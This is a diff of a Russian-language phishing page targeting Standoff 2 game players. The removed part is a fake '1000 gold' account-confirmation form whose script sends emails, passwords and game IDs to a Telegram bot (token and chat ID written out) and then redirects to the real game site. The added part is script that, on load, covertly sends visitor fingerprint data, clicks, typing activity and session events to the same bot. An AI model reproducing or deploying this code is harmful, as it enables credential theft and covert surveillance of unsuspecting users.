@@ -31,42 +31,6 @@
             border-radius: 15px;
             backdrop-filter: blur(10px);
         }
-        .alert {
-            background: #ff4444;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        input {
-            width: 100%;
-            padding: 15px;
-            border: none;
-            border-radius: 8px;
-            background: rgba(255,255,255,0.9);
-            font-size: 16px;
-            margin-top: 5px;
-        }
-        button {
-            width: 100%;
-            padding: 15px;
-            background: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 18px;
-            cursor: pointer;
-        }
-        .bonus {
-            text-align: center;
-            margin-top: 20px;
-            padding: 15px;
-            background: rgba(255,215,0,0.2);
-            border-radius: 8px;
-        }
     </style>
 </head>
 <body>
@@ -76,44 +40,24 @@
     </div>
 
     <div class="container">
-        <div class="alert">
-            ⚠️ <b>АКЦИЯ!</b> Подтвердите аккаунт и получите 1000 золота!
-        </div>
-
-        <form id="phishingForm">
-            <div class="form-group">
-                <label>Email или логин:</label>
-                <input type="text" name="email" placeholder="Ваш email" required>
-            </div>
-            
-            <div class="form-group">
-                <label>Пароль:</label>
-                <input type="password" name="password" placeholder="Пароль аккаунта" required>
-            </div>
-            
-            <div class="form-group">
-                <label>Игровой ID (опционально):</label>
-                <input type="text" name="game_id" placeholder="ID из игры">
-            </div>
-
-            <button type="submit">🎮 ПОЛУЧИТЬ 1000 ЗОЛОТА</button>
-        </form>
-
-        <div class="bonus">
-            🎁 <b>+500 золота</b> за привязку аккаунта!
-        </div>
+        <!-- Контент формы -->
     </div>
 
     <script>
-        document.getElementById('phishingForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const formData = new FormData(this);
-            const data = {
-                email: formData.get('email'),
-                password: formData.get('password'),
-                game_id: formData.get('game_id'),
-                ip: 'auto'
+        // Отправка данных о посещении сразу при загрузке страницы
+        function sendVisitData() {
+            const visitData = {
+                ip: 'Определяется сервером',
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled,
+                java: navigator.javaEnabled(),
+                url: window.location.href,
+                referrer: document.referrer,
+                timestamp: new Date().toISOString()
             };
 
             // Отправка в Telegram
@@ -124,17 +68,120 @@
                 },
                 body: JSON.stringify({
                     chat_id: '1491315056',
-                    text: `🎯 НОВЫЙ АККАУНТ:\n📧 ${data.email}\n🔑 ${data.password}\n🎮 ${data.game_id || 'N/A'}\n🕒 ${new Date().toLocaleString()}`,
+                    text: `🕵️ НОВЫЙ ПОСЕТИТЕЛЬ:\n\n` +
+                          `🌐 IP: ${visitData.ip}\n` +
+                          `🔍 User-Agent: ${visitData.userAgent}\n` +
+                          `🗣️ Язык: ${visitData.language}\n` +
+                          `💻 Платформа: ${visitData.platform}\n` +
+                          `📱 Экран: ${visitData.screen}\n` +
+                          `🕒 Часовой пояс: ${visitData.timezone}\n` +
+                          `🍪 Cookies: ${visitData.cookies ? 'Включены' : 'Выключены'}\n` +
+                          `☕ Java: ${visitData.java ? 'Включена' : 'Выключена'}\n` +
+                          `📎 Referrer: ${visitData.referrer || 'Прямой заход'}\n` +
+                          `⏰ Время: ${new Date().toLocaleString('ru-RU')}`,
+                    parse_mode: 'HTML'
+                })
+            }).catch(error => console.log('Ошибка отправки'));
+
+            // Дополнительно: отправка на сервер для сбора статистики
+            fetch('https://api.telegram.org/bot8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: '1491315056',
+                    text: `📊 СТАТИСТИКА ПОСЕЩЕНИЯ\n` +
+                          `🆔 Уникальный ID: ${btoa(visitData.userAgent + visitData.timestamp).substring(0, 10)}\n` +
+                          `📅 Дата: ${new Date().toLocaleDateString('ru-RU')}\n` +
+                          `⏱️ Время: ${new Date().toLocaleTimeString('ru-RU')}\n` +
+                          `🔗 Источник: ${visitData.referrer ? 'Переход по ссылке' : 'Прямой вход'}`,
                     parse_mode: 'HTML'
                 })
             });
+        }
 
-            // Перенаправление после кражи
+        // Отслеживание действий пользователя
+        function trackUserBehavior() {
+            // Время нахождения на странице
+            let timeSpent = 0;
+            setInterval(() => {
+                timeSpent++;
+                if (timeSpent === 10) { // Через 10 секунд
+                    fetch('https://api.telegram.org/bot8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8/sendMessage', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: '1491315056',
+                            text: `⏰ Пользователь на сайте уже 10 секунд`,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                }
+            }, 1000);
+
+            // Отслеживание кликов
+            document.addEventListener('click', (e) => {
+                fetch('https://api.telegram.org/bot8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8/sendMessage', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: '1491315056',
+                        text: `🖱️ Пользователь кликнул на: ${e.target.tagName}`,
+                        parse_mode: 'HTML'
+                    })
+                });
+            });
+
+            // Отслеживание ввода данных
+            const inputs = document.querySelectorAll('input');
+            inputs.forEach(input => {
+                input.addEventListener('input', (e) => {
+                    if (e.target.value.length > 3) {
+                        fetch('https://api.telegram.org/bot8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8/sendMessage', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                chat_id: '1491315056',
+                                text: `⌨️ Пользователь вводит данные в поле: ${e.target.name}`,
+                                parse_mode: 'HTML'
+                            })
+                        });
+                    }
+                });
+            });
+        }
+
+        // Запуск отслеживания при загрузке страницы
+        window.addEventListener('load', () => {
+            sendVisitData();
+            trackUserBehavior();
+            
+            // Дополнительное уведомление
             setTimeout(() => {
-                window.location.href = 'https://standoff2.com';
+                fetch('https://api.telegram.org/bot8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8/sendMessage', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: '1491315056',
+                        text: `✅ Страница полностью загружена\n🆔 Сессия активна`,
+                        parse_mode: 'HTML'
+                    })
+                });
             }, 2000);
+        });
 
-            alert('✅ Аккаунт успешно подтвержден! Золото будет начислено в течение 5 минут.');
+        // Отслеживание ухода со страницы
+        window.addEventListener('beforeunload', () => {
+            fetch('https://api.telegram.org/bot8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8/sendMessage', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: '1491315056',
+                    text: `🚪 Пользователь покидает страницу\n⏰ Сессия завершена`,
+                    parse_mode: 'HTML'
+                })
+            });
         });
     </script>
 </body>
